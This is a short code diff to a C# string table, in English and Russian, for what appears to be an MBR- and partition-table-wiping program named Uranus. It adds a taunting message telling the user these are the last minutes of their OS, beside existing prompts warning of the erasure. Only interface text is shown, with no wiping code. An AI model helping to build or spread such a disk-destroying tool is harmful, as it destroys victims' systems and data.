@@ -16,7 +16,8 @@ namespace Uranus
             "Unknown option!",
             "Loading",
             "Safe version will not erase\nYour PT and MBR, but your eye \nwill still not like it\nPress '1' if you agree.\nPress Enter if you not.",
-            "Warning! Your PT and MBR will be erased.\nThis is VERY destructive to the OS.\nPress '1' if you agree.\nPress Enter if you not."
+            "Warning! Your PT and MBR will be erased.\nThis is VERY destructive to the OS.\nPress '1' if you agree.\nPress Enter if you not.",
+            "Hey! TheAirBlow here.|This is last minutes of your OS for you to enjoy.|Press OK when you're done."
         };
 
         public static List<string> russian = new List<string>() {
@@ -27,7 +28,8 @@ namespace Uranus
             "Неизвестная опция!",
             "Загрузка",
             "Безопасная версия не сотрёт\nТвой PT и MBR, но твоим глазам\nэто также не понравится.\nНажмите 'S' если вы согласны.\nНажмите Enter если нет.",
-            "Внимание! Твой PT и MBR будут стёрты.\nЭто ОЧЕНЬ опасно для ОС.\nНажмите 'D' если вы согласны.\nНажмите Enter если нет."
+            "Внимание! Твой PT и MBR будут стёрты.\nЭто ОЧЕНЬ опасно для ОС.\nНажмите 'D' если вы согласны.\nНажмите Enter если нет.",
+            "Хей! TheAirBlow тут.|Это последние минуты этой винды, используй их.|Нажми OK когда закончишь."
         };
     }
 }
